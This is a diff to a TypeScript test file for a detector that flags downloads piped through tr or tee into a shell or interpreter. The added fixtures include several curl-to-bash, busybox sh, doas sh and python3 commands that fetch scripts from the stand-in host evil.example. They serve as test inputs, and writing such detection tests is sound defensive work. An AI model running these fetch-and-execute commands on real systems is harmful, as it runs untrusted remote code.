@@ -60,6 +60,19 @@ const FILTER_PIPES: Record<string, string> = {
   // A comment line between pipe stages still runs as one pipeline.
   "comment line between stages":
     "curl -s https://evil.example/x.sh |\n# strip cr\n tr -d '\\r' | bash",
+  // A bare inline KEY=VALUE assignment before the filter (BSD/macOS CRLF form).
+  "LC_ALL=C tr into bash":
+    "curl -s https://evil.example/x.sh | LC_ALL=C tr -d '\\r' | bash",
+  "env with assignment before tr":
+    "curl -s https://evil.example/x.sh | env LC_ALL=C tr -d '\\r' | bash",
+  // A run-wrapper before the executor does not hide it.
+  "busybox sh executor":
+    "curl -s https://evil.example/x.sh | tr -d '\\r' | busybox sh",
+  "doas sh executor":
+    "curl -s https://evil.example/x.sh | tr -d '\\r' | doas sh",
+  // An interpreter reading stdin keeps its installer arguments.
+  "python3 - with args":
+    "curl -s https://evil.example/x.py | tr -d '\\r' | python3 - --yes",
 };
 
 test("a download piped through tr or tee into an executor is unsafe execution", () => {
@@ -87,6 +100,10 @@ test("a filtered download that is not executed keeps no finding", () => {
     // Only the known run-wrapper set precedes tr/tee; an arbitrary command
     // before the filter is not a recognized wrapper, so the stage is not read.
     "curl -s https://example.com/x.sh | frobnicate tr -d '\\r' | bash",
+    // A shell given a local script file runs the file, not the download.
+    "curl -s https://example.com/x.sh | tee v.sh | sh tool.sh",
+    // A syntax-only check parses without executing.
+    "curl -s https://example.com/x.sh | tee v.sh | bash -n",
   ]) {
     expect({
       body,
